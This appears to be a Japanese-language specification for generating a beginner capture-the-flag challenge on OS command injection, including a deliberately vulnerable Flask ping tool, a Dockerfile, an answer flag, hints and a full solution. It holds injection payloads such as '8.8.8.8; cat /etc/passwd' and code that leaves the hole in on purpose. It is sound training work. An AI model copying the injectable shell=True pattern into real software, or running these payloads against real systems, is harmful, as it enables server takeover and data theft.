# System Monitoring Tool: OS Command Injection Basics

## シナリオ

あなたは、NetWatch Security Divisionの調査員として、不審なシステム監視ツールの分析を命じられた。

**ターゲット**: 内部ネットワーク監視ツール  
**目的**: システムへの不正アクセスを試み、隠されたフラグファイルを取得せよ  
**インテル**: このツールは外部コマンド実行機能を持つが、入力検証が不十分である可能性がある。

**ミッション**: コマンドインジェクションを使用して、サーバー上の `/home/ctfuser/flag.txt` を読み取れ。

---

## 技術的背景: OS Command Injectionとは

### 概要

**OS Command Injection（OSコマンドインジェクション）** は、Webアプリケーションが外部プロセスを実行する際、ユーザー入力を適切にサニタイズせずにシェルコマンドに渡すことで発生する脆弱性です。

### 仕組み

1. **通常の処理**:
   ```python
   # ping コマンドを実行
   subprocess.run(f"ping -c 4 {user_input}", shell=True)
   # 入力: 8.8.8.8
   # 実行: ping -c 4 8.8.8.8
   ```

2. **コマンドインジェクション**:
   ```python
   # 悪意のある入力
   # 入力: 8.8.8.8; cat /etc/passwd
   # 実行: ping -c 4 8.8.8.8; cat /etc/passwd
   ```

3. **なぜ成功するのか**:
   - `;` はコマンド区切り文字
   - `shell=True` により、シェルがコマンドを解釈
   - 追加のコマンドが実行される

### 主な攻撃パターン

| 記号 | 用途 | 例 |
|------|------|-----|
| `;` | コマンド区切り | `cmd1; cmd2` |
| `&&` | 前のコマンド成功時に実行 | `cmd1 && cmd2` |
| `\|` | パイプ（前の出力を次に渡す） | `cmd1 \| cmd2` |
| `$()` | コマンド置換 | `echo $(cat /etc/passwd)` |
| `` ` `` | コマンド置換（古い形式） | ``echo `cat /etc/passwd` `` |

---

## 脆弱なコードの仕様

### アプリケーション構成

**技術スタック**:
- **言語**: Python 3.11
- **フレームワーク**: Flask 3.0.0
- **ポート**: 8000
- **機能**: サーバー監視ツール（ping、traceroute等）

### 脆弱なコード実装

**Ping機能（脆弱な実装）**:

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        target = request.form['target']
        
        # ❌ 脆弱性: ユーザー入力をそのままコマンドに結合
        command = f"ping -c 4 {target}"
        
        try:
            # ❌ shell=True でコマンドインジェクションが可能
            result = subprocess.run(
                command, 
                shell=True,  # ← これが重要
                capture_output=True,  # ❌ 出力を返す必要あり
                text=True,
                timeout=10
            )
            
            # ✅ 出力をユーザーに返す
            output = result.stdout + result.stderr
            
            return render_template_string('''
                <h1>Network Monitoring Tool</h1>
                <h2>Ping Result:</h2>
                <pre>{{ output }}</pre>
                <form method="post">
                    Target IP: <input type="text" name="target" value="8.8.8.8">
                    <input type="submit" value="Execute Ping">
                </form>
            ''', output=output)
            
        except subprocess.TimeoutExpired:
            return "Timeout: コマンドの実行に時間がかかりすぎました"
        except Exception as e:
            return f"Error: {str(e)}"
    
    # GET request
    return render_template_string('''
        <h1>Network Monitoring Tool</h1>
        <form method="post">
            Target IP: <input type="text" name="target" placeholder="8.8.8.8">
            <input type="submit" value="Execute Ping">
        </form>
    ''')
```

**フラグファイル**:
- 場所: `/home/ctfuser/flag.txt`
- 内容: `SolCTF{command_injection_is_dangerous}`
- パーミッション: `644` (読み取り可能)

### 重要な実装ポイント

1. **`shell=True` は必須**:
   ```python
   # ✅ 脆弱（問題として正しい）
   subprocess.run(command, shell=True, ...)
   
   # ❌ セキュア（問題として間違い）
   subprocess.run(['ping', '-c', '4', target], shell=False, ...)
   ```

2. **出力を返す**:
   ```python
   # ✅ 正しい
   result = subprocess.run(..., capture_output=True, text=True)
   return result.stdout + result.stderr
   
   # ❌ 間違い（出力が見えない）
   subprocess.run(..., capture_output=True, ...)
   return "コマンドを実行しました"
   ```

3. **入力検証なし**:
   ```python
   # ✅ 脆弱（問題として正しい）
   command = f"ping -c 4 {target}"
   
   # ❌ セキュア（問題として間違い）
   if not re.match(r'^[\d.]+$', target):
       return "Invalid input"
   ```

---

## 攻略手順 (Step-by-Step Methodology)

### ステップ1: 偵察

1. **アクセス**:
   ```
   http://{{CONTAINER_HOST}}/
   ```

2. **画面確認**:
   - 「Network Monitoring Tool」というタイトル
   - IPアドレス入力フィールド
   - 「Execute Ping」ボタン

3. **通常の使用**:
   - 入力: `8.8.8.8`
   - 結果: Pingの実行結果が表示される
   ```
   PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
   64 bytes from 8.8.8.8: icmp_seq=1 ttl=...
   ...
   ```

### ステップ2: 脆弱性の検証

1. **コマンド区切りを試す**:
   - 入力: `8.8.8.8; whoami`
   - 期待される結果: Pingの結果 + `ctfuser`

2. **確認**:
   - 2つのコマンドが実行されている → 脆弱性確認

### ステップ3: フラグファイルの探索

1. **ファイルシステムの探索**:
   ```bash
   # ペイロード
   8.8.8.8; ls -la /home/ctfuser
   ```

2. **フラグファイルの発見**:
   - 出力に `flag.txt` が含まれることを確認

### ステップ4: フラグの取得

**最終ペイロード**:
```bash
8.8.8.8; cat /home/ctfuser/flag.txt
```

**または、より短く**:
```bash
; cat /home/ctfuser/flag.txt
```

**出力例**:
```
PING 8.8.8.8 ...
(ping の結果)

SolCTF{command_injection_is_dangerous}
```

**フラグをコピー**して提出。

---

## 実装時の必須事項

### Dockerfile

```dockerfile
FROM python:3.11-slim

# ユーザー作成
RUN useradd -m -u 1000 ctfuser

# システムツールのインストール（pingコマンド）
RUN apt-get update && apt-get install -y --no-install-recommends \
    iputils-ping \
    && rm -rf /var/lib/apt/lists/*

# フラグファイルの作成（重要！）
RUN echo "SolCTF{command_injection_is_dangerous}" > /home/ctfuser/flag.txt && \
    chmod 644 /home/ctfuser/flag.txt

# 作業ディレクトリ
WORKDIR /home/ctfuser

# アプリケーションファイルをコピー
COPY app.py requirements.txt ./

# 依存パッケージのインストール
RUN pip install --no-cache-dir -r requirements.txt

# 非rootユーザーに切り替え
USER ctfuser

# ポート公開
EXPOSE 8000

# アプリケーション起動
CMD ["python", "app.py"]
```

### 必須パッケージ (`requirements.txt`)

```
Flask==3.0.0
Werkzeug==3.0.0
```

---

## UIデザインの要件

**スタイル**: Industrial / Technical

- 背景色: `#0f0f0f` (ダークグレー)
- テキスト: `#33ff33` (明るい緑、ターミナル風)
- ボーダー: `#333333`
- フォント: `'Courier New', monospace`

**UIイメージ**:
```
╔═══════════════════════════════════════╗
║  NETWATCH SECURITY DIVISION           ║
║  Network Monitoring Tool v2.1         ║
║  [INTERNAL USE ONLY]                  ║
╠═══════════════════════════════════════╣
║  Target IP: [192.168.1.1_______]      ║
║             [  Execute Ping  ]        ║
║                                       ║
║  Last Result:                         ║
║  ┌─────────────────────────────────┐  ║
║  │ PING 192.168.1.1 ...            │  ║
║  │ 64 bytes from 192.168.1.1 ...   │  ║
║  └─────────────────────────────────┘  ║
╚═══════════════════════════════════════╝
```

---

## 対策（参考情報）

### セキュアな実装例

**方法1: shell=False + リスト形式**

```python
# ✅ セキュアな実装（参考：問題には使用しない）
result = subprocess.run(
    ['ping', '-c', '4', target],
    shell=False,  # シェルを使わない
    capture_output=True,
    text=True,
    timeout=10
)
```

**方法2: 入力検証**

```python
# ✅ IPアドレスの検証（参考）
import re
if not re.match(r'^[\d.]+$', target):
    return "Error: Invalid IP address format"
```

**方法3: ホワイトリスト**

```python
# ✅ 許可されたコマンドのみ実行（参考）
ALLOWED_COMMANDS = {
    'ping': ['ping', '-c', '4'],
    'traceroute': ['traceroute', '-m', '10']
}
```

---

## 教育的価値

### この問題で学べること

1. **OSコマンドの仕組み**:
   - シェルによるコマンド解釈
   - コマンド区切り文字の理解
   - プロセス実行のメカニズム

2. **Pythonのsubprocessモジュール**:
   - `shell=True` vs `shell=False` の違い
   - セキュリティへの影響

3. **入力検証の重要性**:
   - 信頼できない入力の危険性
   - サニタイズの必要性

4. **実践的なペネトレーションテスト**:
   - ペイロード構築
   - ファイルシステムの探索
   - フラグの抽出

### 対象ユーザー

- **初心者〜中級者**: LinuxコマンドとPythonの基礎知識あり
- **難易度**: 2/5 (初級〜中級)
- **所要時間**: 20-30分
- **前提知識**: 基本的なLinuxコマンド（`ls`, `cat`, `whoami`）

---

## 期待される生成物

### Flaskアプリケーション (`app.py`)

**必須機能**:
1. ルート `/` でモニタリング画面を表示
2. POSTで `target` パラメータを受け取る
3. `subprocess.run()` で **`shell=True`** を使用
4. コマンドの実行結果を画面に表示
5. タイムアウト処理（10秒）

**禁止事項**:
- `/flag` エンドポイント
- `shell=False`（脆弱性が動作しない）
- 入力検証（IPアドレスチェック等）
- `capture_output=True` で出力を隠すこと

### Dockerfile

**必須要素**:
1. `FROM python:3.11-slim`
2. `iputils-ping` のインストール（ping コマンド）
3. `ctfuser` ユーザーの作成
4. `/home/ctfuser/flag.txt` の作成（重要！）
5. パーミッション設定 (`chmod 644`)

**フラグ配置例**:
```dockerfile
RUN echo "SolCTF{command_injection_is_dangerous}" > /home/ctfuser/flag.txt && \
    chmod 644 /home/ctfuser/flag.txt
```

---

## 攻略手順の詳細

### 基本的なペイロード

```bash
# ペイロード1: whoamiで確認
8.8.8.8; whoami
# 期待: ctfuser

# ペイロード2: ディレクトリ確認
8.8.8.8; ls -la /home/ctfuser
# 期待: flag.txt が表示される

# ペイロード3: フラグ取得
8.8.8.8; cat /home/ctfuser/flag.txt
# 期待: SolCTF{...}
```

### 応用ペイロード

```bash
# パイプを使用
8.8.8.8 | cat /home/ctfuser/flag.txt

# ANDを使用
8.8.8.8 && cat /home/ctfuser/flag.txt

# コマンド置換
$(cat /home/ctfuser/flag.txt)

# 改行文字（エンコード済み）
8.8.8.8%0Acat%20/home/ctfuser/flag.txt
```

---

## 難易度設定

### 推奨値

```json
{
  "difficulty": 2,
  "difficulty_factors": {
    "tech": 2,
    "read": 2,
    "explore": 2
  }
}
```

**理由**:
- **tech=2**: 基本的なコマンドインジェクション、ペイロードはシンプル
- **read=2**: コードを読まなくても解ける（ブラックボックス）
- **explore=2**: フラグの場所を探索する必要あり

**計算**: `Round(2 * 0.4 + 2 * 0.2 + 2 * 0.4) = Round(2.0) = 2`

---

## ストーリー要素

### Story Hook

```
NetWatch のセキュリティ監査により、内部ネットワーク監視ツールに脆弱性が発見された。
このツールは外部コマンド実行機能を持ち、入力値のサニタイズが不十分である。
攻撃者がこの脆弱性を悪用する前に、侵入経路を特定し、証拠（フラグ）を確保せよ。
```

---

## タグ

- Web
- RCE
- Command Injection
- Beginner
- Linux
- NetWatch
- System Tools

---

## 実装チェックリスト

### 生成後に確認すべき項目

- [ ] `subprocess.run()` で `shell=True` が使用されている
- [ ] 出力（`stdout`, `stderr`）がユーザーに返される
- [ ] `/home/ctfuser/flag.txt` が Dockerfile で作成されている
- [ ] `/flag` エンドポイントが存在しない
- [ ] 入力検証が行われていない（脆弱性が動作する）
- [ ] `iputils-ping` がインストールされている
- [ ] タイムアウト処理がある

---

## CVE参考情報

### 関連するCVE例

- **CVE-2021-XXXX**: Command Injection in Monitoring Tools
- **CVSS Score**: 9.8 (Critical)
- **Attack Vector**: Network
- **Privileges Required**: None
- **Impact**: Remote Code Execution

### 実世界での影響

- サーバーの完全制御
- データの窃取・改ざん
- バックドアの設置
- ラテラルムーブメント（横展開）

---

## ヒント（オプション）

### ヒント1（初級）

「Linuxのコマンドは `;` で区切って複数実行できる。`command1; command2` のように。」

### ヒント2（中級）

「サーバー上のファイルを探すには `ls` コマンドが使える。ホームディレクトリは `/home/ctfuser/` だ。」

### ヒント3（最終）

「ペイロード: `8.8.8.8; cat /home/ctfuser/flag.txt` を試してみよう。」

---

**このファイルを使用したコマンド**:

```bash
python tools/cli.py auto-add --source inputs/command_injection_basic.md --no-deploy
```

**期待される成果物**:
- 高品質なOS Command Injection問題（難易度2）
- 実践的で教育的な内容
- NetWatch風のUIデザイン
- ステップバイステップの解説

